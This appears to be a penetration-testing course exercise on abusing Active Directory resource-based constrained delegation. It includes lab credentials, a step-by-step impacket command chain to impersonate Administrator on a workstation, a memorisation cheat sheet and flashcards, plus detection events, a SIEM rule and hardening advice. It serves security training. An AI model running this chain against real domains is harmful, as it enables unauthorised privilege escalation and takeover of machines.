    Exercise 4.5: Resource-Based Constrained Delegation (RBCD)

    Before You Begin

    Resource-Based Constrained Delegation (RBCD) is the post-2012 evolution of constrained delegation. Instead of the source account declaring which services it can delegate to (the classic msDS-AllowedToDelegateTo), the target resource declares which sources are allowed to delegate to it via the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. The trust direction reverses; the privilege required to configure changes from the rare SeEnableDelegationPrivilege to the much more common WriteProperty on the target's RBCD attribute.

    The default ms-DS-MachineAccountQuota of 10 means any authenticated user can create up to 10 computer accounts. An attacker who can write the RBCD attribute on a target computer can: create their own computer account, write that account's SID into the target's RBCD list, then S4U2self+S4U2proxy from their controlled account to impersonate any user (including Administrator) to the target.

    Exercise 4.5 has IT_HelpDesk granted WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity of WS-FIN-<TOKEN>. j.chen is a member. Take over.

    Tools required: impacket-addcomputer, impacket-rbcd, impacket-getST, smbclient, ldapsearch. Pre-installed on Kali.

    Scenario

    Marcus Bell: "RBCD is constrained delegation in reverse. Instead of asking the source account 'who can you delegate for?' you ask the target computer 'who do you trust to delegate to you?' If you can write to that attribute, you trust yourself."

    The flag is \\WS-FIN-<TOKEN>\C$\rbcd_flag_<token>.txt, readable as Administrator.

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local

    Your Objectives

    • Verify ms-DS-MachineAccountQuota >= 1
    • Create attacker-controlled computer account fakectrl_<token>$
    • Write its SID into msDS-AllowedToActOnBehalfOfOtherIdentity on WS-FIN-<TOKEN>
    • Use S4U2self+S4U2proxy from fakectrl_<token>$ to obtain a TGS for cifs/WS-FIN-<TOKEN> as Administrator
    • Read \\WS-FIN-<TOKEN>\C$\rbcd_flag_<token>.txt

    The RBCD Chain in Four Boxes

    Each step writes a small change in AD; the cumulative effect is local-admin on the target. The diagram below is the chain you will execute.

    Classic vs RBCD Trust Direction

    The trust arrow flips between the two delegation styles. The diagram below shows the difference at a glance.

    flowchart LR
    subgraph Classic["Classic constrained delegation"]
        S1["Source: svc_deleg<br/>msDS-AllowedToDelegateTo = cifs/dc01"]
        T1["Target: dc01"]
        S1 -- "source declares the trust" --> T1
    end
    subgraph RBCD["Resource-Based Constrained Delegation"]
        S2["Source: fakectrl<br/>(any account you control)"]
        T2["Target: ws01<br/>msDS-AllowedToActOnBehalfOfOtherIdentity = fakectrl"]
        T2 -- "target declares the trust" --> S2
    end

    Background: Why RBCD Is Easier to Abuse Than Classic Constrained Delegation

    Property Classic constrained delegation RBCD
    Attribute that lists allowed services / sources msDS-AllowedToDelegateTo (on source) msDS-AllowedToActOnBehalfOfOtherIdentity (on target)
    Privilege required to configure SeEnableDelegationPrivilege (Domain Admins / Account Operators) Any ACL right that includes WriteProperty on the target's attribute
    Common ACL paths Rare; tightly held Common; helpdesk groups often have GenericWrite or WriteProperty on workstations
    Detection signal Schema-protected attribute changes; rare Standard ACL writes; lost in noise
    Mitigation difficulty Medium (the attribute is rarely needed) Hard (RBCD is widely used for legitimate Windows servicing)

    The shift from source-side to target-side configuration is what makes RBCD a frequent finding. Helpdesk teams routinely have GenericWrite on workstation OUs (so they can rename machines, push GPOs, etc.); GenericWrite includes WriteProperty on every attribute, including the RBCD one.

    ms-DS-MachineAccountQuota: the unrelated default that enables RBCD abuse

    ms-DS-MachineAccountQuota defaults to 10. The quota means every authenticated user can create up to 10 computer accounts in the domain. The intent is to support self-service domain join (a user joins their workstation to the domain). The side effect is that any compromised account can create a controlled computer account whose password it knows.

    The defender control is to set ms-DS-MachineAccountQuota = 0 and grant computer-creation rights only to a specific provisioning account. Most environments leave the default in place because changing it breaks self-service domain join workflows.

    The full RBCD attack chain

    1. addcomputer.py: create fakectrl_<token>$ with a known password
2. rbcd.py write: add fakectrl_<token>$'s SID to WS-FIN-<TOKEN>'s
   msDS-AllowedToActOnBehalfOfOtherIdentity
3. getST.py with the controlled account credentials, S4U flow:
     S4U2self -> get a TGS for fakectrl_<token>$-as-Administrator
     S4U2proxy -> get a TGS for cifs/WS-FIN-<TOKEN>-as-Administrator
4. Use the TGS to mount C$ on the target as Administrator

    The chain is four commands. Each is well-documented in impacket. The combination is one of the most common AD privesc paths discovered in modern internal pentests.

    Tool Primer

    Verify MachineAccountQuota

    ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" -s base \
  "(objectClass=*)" ms-DS-MachineAccountQuota

    Or with netexec:

    netexec ldap corp-dc01 -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  -M maq

    Create a controlled computer account

    addcomputer.py -computer-name 'fakectrl_<token>' \
  -computer-pass 'AttackerPwd2026#' \
  -dc-host corp-dc01 -domain-netbios CORP \
  corp.nordport.local/j.chen:'Welcome2026#'

    The trailing $ in computer SAM accounts is added automatically by impacket. The account is enabled with the password you specify.

    Write RBCD attribute

    rbcd.py -delegate-from "fakectrl_<token>$" \
  -delegate-to "WS-FIN-<TOKEN>$" \
  -dc-ip <dc> -action write \
  corp.nordport.local/j.chen:'Welcome2026#'

    To remove later:

    rbcd.py ... -action remove

    S4U2self + S4U2proxy as the controlled computer

    getST.py -spn "cifs/WS-FIN-<TOKEN>.corp.nordport.local" \
  -impersonate Administrator \
  -dc-ip <dc> \
  "corp.nordport.local/fakectrl_<token>\$:AttackerPwd2026#"

    Note the escaped \$ in the SAM (fakectrl_<token>$); shell escaping varies. The output ccache is named after the impersonated user.

    Use the ticket

    export KRB5CCNAME=Administrator.ccache
smbclient //WS-FIN-<TOKEN>.corp.nordport.local/C$ -k -c "ls; get rbcd_flag_<token>.txt"

    Walkthrough

    Step 1: Verify MachineAccountQuota

    ms-DS-MachineAccountQuota lives on the domain naming context root and applies to every authenticated user. The -s base scope plus an empty filter (objectClass=*) returns just the root object's attributes. Any non-zero value enables the rest of the chain.

    Kali - Confirm MAQ >= 1

    ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" -s base \
  "(objectClass=*)" ms-DS-MachineAccountQuota
    Token Effect
    -s base Search scope: just the base DN, no children.
    (objectClass=*) Match any object (the only object at base scope is the root).
    ms-DS-MachineAccountQuota Trailing attribute; only this attribute returned.

    A value of 10 (the Microsoft default) means each user can create up to 10 computer accounts. Anything > 0 is sufficient for this exercise. A value of 0 means the chain breaks at Step 2; you would need to compromise an existing computer account instead.

    Step 2: Create the Controlled Computer Account

    addcomputer.py calls SAMR's SamrCreateUser2InDomain to create a computer-class user object. The MAQ check happens server-side; if you have not exhausted your 10-account quota, the create succeeds. The new account's password is whatever you supply on the command line.

    Kali - addcomputer.py

    addcomputer.py -computer-name "fakectrl_${OCR_SCOPE_TOKEN}" \
  -computer-pass 'AttackerPwd2026#' \
  -dc-host corp-dc01 -domain-netbios CORP \
  "corp.nordport.local/j.chen:Welcome2026#"
    Flag Effect
    -computer-name SAM name (without trailing $); impacket appends it.
    -computer-pass Initial password for the account.
    -dc-host DC hostname (used for SMB to the DC).
    -domain-netbios NetBIOS domain name (capitalized).
    <realm>/<user>:<pw> Authenticate as this domain user.

    On success the message says the computer account was created. Verify by authenticating as it (the \$ escapes the $ from shell interpretation):

    netexec smb corp-dc01 -u "fakectrl_${OCR_SCOPE_TOKEN}\$" \
  -p 'AttackerPwd2026#' -d corp.nordport.local

    Step 3: Write the RBCD Attribute

    rbcd.py write modifies msDS-AllowedToActOnBehalfOfOtherIdentity on the target. The attribute is a binary security descriptor; impacket reads any existing value, appends the source's SID, and writes the new descriptor back. The DC checks j.chen's effective rights on the target's attribute; the WriteProperty grant from IT_HelpDesk membership permits the modification.

    Kali - rbcd.py write

    TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
rbcd.py -delegate-from "fakectrl_${OCR_SCOPE_TOKEN}\$" \
        -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action write \
        "corp.nordport.local/j.chen:Welcome2026#"
    Flag Effect
    -delegate-from The source account that will be allowed to delegate.
    -delegate-to The target computer whose attribute is being modified.
    -action write Add the source SID; read queries; remove undoes.
    -dc-ip <ip> DC IP.

    Successful output reports the new RBCD entry. To verify the write landed:

    rbcd.py -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action read \
        "corp.nordport.local/j.chen:Welcome2026#"

    Step 4: S4U2self + S4U2proxy

    With fakectrl_<token>$ listed in the target's RBCD attribute, the same getST.py flow used in 4.4 now works against this target. The KDC validates the source SID against the target's attribute (rather than against the source's msDS-AllowedToDelegateTo); both validate paths converge on issuing a usable TGS.

    Kali - getST.py from controlled account

    cd ~/work && mkdir -p adpt-4-05 && cd adpt-4-05
TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
getST.py -spn "cifs/WS-FIN-${TOK}.corp.nordport.local" \
         -impersonate Administrator \
         -dc-ip <dc_ip> \
         "corp.nordport.local/fakectrl_${OCR_SCOPE_TOKEN}\$:AttackerPwd2026#"
    Flag Effect
    -spn <svc>/<host>.<realm> Target service. Must match how SMB derives the SPN.
    -impersonate <user> The user identity that will appear in the issued ticket.
    <realm>/<computer>$:<pw> Source authentication; computer accounts use the trailing $.

    The output is Administrator.ccache.

    Step 5: Read the Flag

    The ccache contains a TGS for cifs/WS-FIN-<token> issued to Administrator. SMB uses it transparently when KRB5CCNAME points at the file. The target's CIFS service authenticates the request as Administrator, who has full read on C$.

    Kali - SMB to the target as Administrator

    export KRB5CCNAME=Administrator.ccache
klist
smbclient "//WS-FIN-${TOK}.corp.nordport.local/C$" -k \
  -c "get rbcd_flag_${OCR_SCOPE_TOKEN}.txt"
cat rbcd_flag_${OCR_SCOPE_TOKEN}.txt

    Submit the OCR{...} value.

    Step 6: Cleanup

    Two artifacts were created: the RBCD entry on the target and the controlled computer account itself. Remove both. Order does not matter for cleanup; either can come first.

    Kali - Remove RBCD entry and computer account

    rbcd.py -delegate-from "fakectrl_${OCR_SCOPE_TOKEN}\$" \
        -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action remove \
        "corp.nordport.local/j.chen:Welcome2026#"

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove object "fakectrl_${OCR_SCOPE_TOKEN}\$"

    The computer account belongs to j.chen (its mS-DS-CreatorSID is j.chen's SID), so j.chen has implicit delete rights regardless of any DACL.

    Common gotchas

    • MAQ exhausted: re-running addcomputer.py with the same name on a different attempt counts toward the quota even if the prior account was deleted (the count is creation-side, not present-state). Use a different -computer-name if you exhaust 10.
    • Wrong target case: WS-FIN-J001$ and ws-fin-j001$ resolve to the same object in LDAP, but getST.py -spn and smbclient //... are case-sensitive on the host portion. Stick with uppercase consistently.
    • Shell $ expansion: bash treats $WORD as a variable. Always escape the trailing $ in computer SAMs as \$ or quote the whole string with single quotes.
    • LDAP signing required: if the domain enforces LDAP signing, the rbcd.py SASL bind must be properly negotiated. Add -k to use Kerberos instead of NTLM if the simple bind fails.
    • Cleanup forgotten: leaving fakectrl_$ behind exhausts your MAQ over time. Always remove it.

    Blue Team Perspective

    Three distinct events fire across the chain. None alone is high-signal; the combination from one source IP across two minutes is.

    Activity Event ID Where it fires
    Computer account created (MAQ=10) 4741 DC Security log
    RBCD attribute written 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity) DC Security log
    S4U2proxy issued 4769 with cname-in-pa-data ticket option DC Security log
    Auth as Administrator on target 4624 logon type 3 Target host log

    How RBCD differs from classic CD detection

    Classic constrained delegation has a tight detection on SeEnableDelegationPrivilege use; RBCD has no such privilege gate, so detection has to live in the attribute write itself. SIEM rule that catches RBCD reliably: alert on event 5136 where Object Class = computer and Attribute LDAP Display Name = msDS-AllowedToActOnBehalfOfOtherIdentity from any non-Tier-0 principal. Volume is low; signal is high.

    Hardening Note

    RBCD is a legitimate Windows servicing primitive; you cannot ban it. You harden the conditions that make it abusable.

    Practical RBCD hardening

    • Set ms-DS-MachineAccountQuota = 0 and grant computer creation only to a dedicated provisioning account.
    • Audit msDS-AllowedToActOnBehalfOfOtherIdentity weekly across all computer objects; baseline the legitimate entries.
    • Tighten ACLs on workstation OUs: helpdesk groups should have specific extended rights, not GenericWrite.
    • Mark Tier-0 accounts with Account is sensitive and cannot be delegated (NOT_DELEGATED UAC bit).
    • Enforce LDAP signing and channel binding to break NTLM-relay-to-LDAP RBCD chains.
    • Build SIEM detection on event 5136 for the RBCD attribute.

    Analysis Questions

    1. The classic constrained delegation attribute requires SeEnableDelegationPrivilege to write. Why doesn't RBCD's msDS-AllowedToActOnBehalfOfOtherIdentity have a similar protection?

    Reveal Answer

    RBCD was designed to support modern Windows Server features (cluster failover, IIS app-pool delegation, AD FS) where the target resource needs to declare its own delegation trust without needing a Tier-0 administrator to make the change every time. The attribute is therefore writeable via standard ACLs (WriteProperty), which is convenient for legitimate distributed Windows applications but easy to abuse: any helpdesk group with GenericWrite over a workstation OU now effectively has the right to take over every workstation in that OU. Microsoft considered the trade-off acceptable because the modern Windows servicing model assumes the target resource's administrator (which for workstations is typically the local IT team) should be allowed to declare delegation trust. The defender mitigation is to ensure no group with broad workstation-OU rights includes accounts that should not be effective local admin everywhere.

    2. The default ms-DS-MachineAccountQuota = 10 is the enabling condition. What breaks if a defender sets it to 0?

    Reveal Answer

    Self-service domain join breaks. A user who runs the "Add this computer to the domain" wizard on a freshly imaged workstation needs the right to create a computer account; the default quota of 10 supports that without administrative intervention. Setting MAQ to 0 forces every domain join to be performed by an administrator (or a delegated account explicitly granted the Create Computer Objects extended right on the target OU). Many enterprises with mature provisioning automation set MAQ to 0 because their MDT / Intune / SCCM workflows handle domain join via a dedicated service account; the convenience of self-service is not needed. Smaller organizations leave the default and accept the RBCD risk. The defender's compromise: set MAQ to 0 and grant Create Computer Objects to a specific provisioning service account that lives in a tightly-controlled OU.

    3. The attack works because we control the source account's password (we just created it). What if MAQ is 0 and we cannot create a computer? Are there other paths to RBCD exploitation?

    Reveal Answer

    Yes. Three alternative source-account acquisitions: (a) compromise an existing computer account by other means; machine accounts have the same delegation capabilities as user accounts, and pulling a machine secret via secretsdump.py -system or via mimikatz lsadump::secrets from a compromised host yields a usable source. (b) Compromise a service account (Kerberoast, ASREPRoast, GenericAll-then-reset). (c) Use coerced authentication from a target machine to the attacker's listener; the captured Net-NTLM hash can be relayed to LDAP to write the RBCD attribute as the coerced computer's identity. The relayed-to-LDAP-then-RBCD-then-S4U flow is documented in CVE-2019-1040 era write-ups and remains effective when LDAP signing is not enforced. Setting MAQ to 0 closes the easiest path; the RBCD primitive itself remains exploitable through these alternatives until the defender hardens the underlying ACL paths.

    Key Takeaways

    • RBCD reverses the trust direction: target declares trust; source impersonates.
    • The trigger is WriteProperty on the target's msDS-AllowedToActOnBehalfOfOtherIdentity, not the rare SeEnableDelegationPrivilege.
    • ms-DS-MachineAccountQuota = 10 lets any user create the source account they need.
    • Four-tool chain: addcomputer.py -> rbcd.py write -> getST.py -> smbclient -k.
    • Mitigation: MAQ=0 plus tightly-scoped helpdesk ACLs on workstation OUs; LDAP signing enforced.

    Cheat Sheet Recap

    The four operations below cover the entire RBCD chain. Memorize the order; this attack still works in 2026 against most internal environments.

    Step Command
    1. Create controlled computer addcomputer.py -computer-name '<name>' -computer-pass '<pw>' -dc-host <dc> -domain-netbios <NETBIOS> <domain>/<atk>:'<pw>'
    2. Write RBCD attribute rbcd.py -delegate-from "<name>\$" -delegate-to "<TARGET>\$" -dc-ip <dc> -action write <domain>/<atk>:'<pw>'
    3. S4U2self + S4U2proxy getST.py -spn 'cifs/<target>.<domain>' -impersonate Administrator -dc-ip <dc> "<domain>/<name>\$:<pw>"
    4. Use the ticket export KRB5CCNAME=Administrator.ccache; smbclient //<target>/C$ -k -c "ls"

    Spaced Repetition

    Card 1: RBCD vs Classic Constrained Delegation

    Q: Where is the trust list stored for classic constrained delegation vs RBCD?

    Answer

    Classic: msDS-AllowedToDelegateTo on the source account, listing target SPNs the source may delegate to. RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer, listing source SIDs allowed to delegate to it. Classic is configured by Tier-0 (SeEnableDelegationPrivilege); RBCD is configured by anyone with WriteProperty on the target's attribute, which is a much more common ACL right.

    Card 2: addcomputer.py Syntax

    Q: Write the command to create computer account fake01 with password Pwd# against corp.local DC dc01 as j.smith / Pass#.

    Answer 
    addcomputer.py -computer-name 'fake01' \
  -computer-pass 'Pwd#' \
  -dc-host dc01 -domain-netbios CORP \
  corp.local/j.smith:'Pass#'

    The $ suffix is added automatically. Default MAQ allows this for any user. Confirm with netexec smb dc01 -u 'fake01$' -p 'Pwd#'.

    Card 3: rbcd.py write

    Q: Write the rbcd.py command to add fake01$ to WS01$'s allowed list against corp.local DC dc01 as j.smith / Pass#.

    Answer 
    rbcd.py -delegate-from "fake01\$" -delegate-to "WS01\$" \
  -dc-ip dc01 -action write \
  corp.local/j.smith:'Pass#'

    Replace write with read to query, remove to clean up. The \$ escapes shell expansion of the $.

    Card 4: S4U from a Controlled Computer Account

    Q: Write the getST.py command to obtain a TGS for cifs/ws01.corp.local impersonating Administrator using fake01$ / Pwd# as source.

    Answer 
    getST.py -spn 'cifs/ws01.corp.local' -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  "corp.local/fake01\$:Pwd#"

    Output: Administrator.ccache. Use with KRB5CCNAME=Administrator.ccache smbclient //ws01.corp.local/C$ -k.

    Card 5: MAQ Mitigation

    Q: One change to ms-DS-MachineAccountQuota that closes the easy RBCD source-account path; what breaks?

    Answer

    Set ms-DS-MachineAccountQuota = 0 on the domain object. Self-service domain join breaks; users can no longer add their own workstation. The mitigation is to grant a dedicated provisioning account Create Computer Objects extended right on a specific OU and use that account for all domain joins via SCCM / MDT / Intune. Mature environments do this routinely; smaller environments accept the RBCD risk to keep self-service join working.
